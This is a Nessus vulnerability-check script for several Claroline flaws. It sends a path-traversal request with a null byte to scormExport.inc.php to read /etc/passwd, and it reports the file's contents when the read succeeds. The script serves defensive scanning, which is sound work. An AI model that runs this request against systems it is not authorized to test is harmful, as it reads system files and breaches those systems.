#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(21167);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-1594", "CVE-2006-1595", "CVE-2006-1596");
  script_bugtraq_id(17341, 17343, 17344);
  script_xref(name:"OSVDB", value:"24284");
  script_xref(name:"OSVDB", value:"24285");
  script_xref(name:"OSVDB", value:"24286");

  script_name(english:"Claroline Multiple RemoteVulnerabilities (RFI, Traversal, XSS)");
  script_summary(english:"Tries to read /etc/passwd using Claroline");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
several issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Claroline, an open source, web-based,
collaborative learning environment written in PHP. 

The version of Claroline installed on the remote host fails to
sanitize input to the 'includePath' parameter before using it in the
'claroline/learnPath/include/scormExport.inc.php' script to include
files with PHP code.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit this issue
to view arbitrary files on the remote host or to execute arbitrary PHP
code, possibly taken from third-party hosts. 

In addition, the installation reportedly suffers from a cross-site
scripting and several information disclosure vulnerabilities." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/claroline_174_incl_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.claroline.net/news.php" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch appropriate for the installed version of Claroline as
listed in the vendor advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("claroline_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method: "GET", port: port,
    item:string(
      dir, "/claroline/learnPath/include/scormExport.inc.php?",
      "includePath=", file
    ) );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0/lib/fileUpload.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening '/etc/passwd\\0/lib/fileUpload", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd[^)]*\): failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File \(/etc/passwd", string:res)
  )
  {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      report = string(
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_hole(port:port, extra:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
